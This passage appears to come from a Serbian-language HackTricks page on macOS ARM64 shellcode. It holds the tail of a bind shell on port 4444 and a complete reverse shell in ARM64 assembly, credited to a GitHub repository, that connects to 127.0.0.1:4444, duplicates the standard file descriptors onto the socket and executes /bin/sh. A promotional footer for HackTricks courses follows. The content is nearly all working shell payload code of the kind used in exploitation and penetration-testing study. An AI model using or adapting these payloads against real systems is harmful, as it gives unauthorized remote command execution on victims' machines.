*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Sa [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell na **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
